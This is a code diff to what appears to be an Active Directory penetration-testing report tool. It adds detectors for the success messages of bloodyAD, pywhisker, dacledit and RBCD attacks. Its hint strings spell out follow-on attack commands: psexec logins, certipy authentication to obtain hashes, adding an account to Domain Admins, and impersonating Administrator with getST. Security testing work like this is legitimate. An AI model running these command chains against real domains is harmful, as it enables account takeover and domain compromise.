@@ -8362,6 +8362,126 @@ def _multiline_passes(path, report, store):
                                              "missing_oscp_kbs":
                                              [kb for kb, _ in _missing]}))
 
+    # iter-297: bloodyAD / pywhisker / dacledit attack-landed markers.
+    # These tools are common OSCP+ AD attack chains (ACL abuse ->
+    # weaponize). Each success message means a specific attack primitive
+    # completed - we surface as CRITICAL RECON so operator's report
+    # shows "attack landed" chip rather than requiring transcript scroll.
+    #
+    # Password reset landed (bloodyAD / net rpc password / rpcclient):
+    #   [+] Password changed successfully!
+    # Shadow-cred write landed (bloodyAD / pywhisker / Certipy):
+    #   [+] KeyCredential added to CN=svc_backup,CN=Users,DC=corp,DC=local
+    #   [+] KeyCredential written to victim's account
+    # DACL grant landed (bloodyAD / dacledit):
+    #   [+] Added ACE (DACL) to CN=Domain Admins,CN=Users,DC=corp,DC=local
+    # RBCD write landed:
+    #   [+] Successfully added msDS-AllowedToActOnBehalfOfOtherIdentity
+    _BAD_PW_RESET = re.compile(
+        r'(?i)\[[+*]\]\s+Password\s+changed\s+successfully!?')
+    _BAD_KEYCRED = re.compile(
+        r'(?i)\[[+*]\]\s+KeyCredential\s+(?:added|written)'
+        r'(?:\s+to\s+(CN=[^\r\n]{5,240}))?')
+    _BAD_DACL = re.compile(
+        r'(?i)\[[+*]\]\s+Added\s+ACE\s+\(DACL\)\s+to\s+'
+        r'(CN=[^\r\n]{5,240})')
+    _BAD_RBCD = re.compile(
+        r'(?i)\[[+*]\]\s+Successfully\s+added\s+'
+        r'msDS-AllowedToActOnBehalfOfOtherIdentity')
+    if not filters.is_doc_file(path):
+        # Password reset - the target user may not be captured on the
+        # same line; find the closest `bloodyAD ... set password X`
+        # invocation within the 500 preceding chars for attribution.
+        for _pm in _BAD_PW_RESET.finditer(text[:65536]):
+            _preceding = text[max(0, _pm.start() - 500):_pm.start()]
+            _u_m = re.search(
+                r'(?i)set\s+password\s+([\w.\-$]{1,60})', _preceding)
+            _tgt_user = _u_m.group(1) if _u_m else "<unknown>"
+            _tgt_sh = _tgt_user.replace("'", "'\\''")
+            report.add("CRITICAL", "RECON", path, _ln(_pm),
+                       f"bloodyAD password reset landed: {_tgt_user} "
+                       f"pw reset (attack complete)",
+                       hint=(f"target now has attacker-chosen pw - "
+                             f"login: nxc smb <dc> -u '{_tgt_sh}' -p "
+                             f"'<newpw>'  |  or impacket-psexec "
+                             f"'<dom>/{_tgt_sh}:<newpw>'@<host>  |  "
+                             f"OPSEC: pw was reset, target's real "
+                             f"user is now locked out - detection "
+                             f"tripwire on password-history alerts"))
+            if store is not None:
+                store.add(Evidence(kind="attack_landed", user=_tgt_user,
+                                   source=path, line=_ln(_pm),
+                                   meta={"attack_type": "pw_reset"}))
+        _kc_seen = set()
+        for _km in _BAD_KEYCRED.finditer(text[:65536]):
+            _target_dn = (_km.group(1) or "").strip()
+            _cn_m = re.match(r'(?i)CN=([^,]{1,60})', _target_dn) if _target_dn else None
+            _tgt = _cn_m.group(1) if _cn_m else "<target>"
+            _sig = _tgt.lower()
+            if _sig in _kc_seen:
+                continue
+            _kc_seen.add(_sig)
+            _tgt_sh = _tgt.replace("'", "'\\''")
+            report.add("CRITICAL", "RECON", path, _ln(_km),
+                       f"Shadow-credential written to {_tgt} "
+                       f"(bloodyAD/pywhisker/Certipy shadow attack "
+                       f"landed)",
+                       hint=(f"NEXT: certipy auth -pfx <saved.pfx> -"
+                             f"domain <dom> -dc-ip <dc>  |  yields "
+                             f"TGT + NT hash for '{_tgt_sh}'  |  then"
+                             f" impacket-psexec -k -no-pass '{_tgt_sh}'"
+                             f"@<host>  |  cleanup: bloodyAD remove "
+                             f"shadowCredentials {_tgt_sh}"))
+            if store is not None:
+                store.add(Evidence(kind="attack_landed", user=_tgt,
+                                   source=path, line=_ln(_km),
+                                   meta={"attack_type": "shadow_cred",
+                                         "target_dn": _target_dn[:200]}))
+        _dacl_seen = set()
+        for _dm in _BAD_DACL.finditer(text[:65536]):
+            _target_dn = _dm.group(1).strip()
+            _cn_m = re.match(r'(?i)CN=([^,]{1,60})', _target_dn)
+            _tgt = _cn_m.group(1) if _cn_m else _target_dn[:60]
+            _sig = _tgt.lower()
+            if _sig in _dacl_seen:
+                continue
+            _dacl_seen.add(_sig)
+            _tgt_sh = _tgt.replace("'", "'\\''")
+            _sev = "CRITICAL" if _tgt.lower() in (
+                "domain admins", "administrators",
+                "enterprise admins") else "HIGH"
+            report.add(_sev, "RECON", path, _ln(_dm),
+                       f"DACL grant landed on {_tgt} (bloodyAD/"
+                       f"dacledit ACL abuse attack complete)",
+                       hint=(f"we now have the granted right on "
+                             f"'{_tgt_sh}' - if GenericAll/WriteOwner"
+                             f": reset pw or set shadow-cred  |  if "
+                             f"WriteMember (on a group): net rpc "
+                             f"group addmem '{_tgt_sh}' <ourself> -U "
+                             f"'<abuse>%<pw>' -S <dc> for Domain "
+                             f"Admins auto-membership"))
+            if store is not None:
+                store.add(Evidence(kind="attack_landed", user=_tgt,
+                                   source=path, line=_ln(_dm),
+                                   meta={"attack_type": "dacl_grant",
+                                         "target_dn": _target_dn[:200]}))
+        _rbcd_m = _BAD_RBCD.search(text[:65536])
+        if _rbcd_m:
+            report.add("CRITICAL", "RECON", path, _ln(_rbcd_m),
+                       "RBCD write landed (bloodyAD/rbcd.py added "
+                       "msDS-AllowedToActOnBehalfOfOtherIdentity)",
+                       hint=("we control the SID in the RBCD "
+                             "attribute - impersonate any user to "
+                             "the target: impacket-getST -impersonate"
+                             " Administrator -spn CIFS/<target-fqdn>"
+                             " '<dom>/<our-controlled-account>' -"
+                             "hashes :<NT>  |  then export KRB5CCNAME"
+                             " + impacket-psexec -k -no-pass"))
+            if store is not None:
+                store.add(Evidence(kind="attack_landed",
+                                   source=path, line=_ln(_rbcd_m),
+                                   meta={"attack_type": "rbcd_write"}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
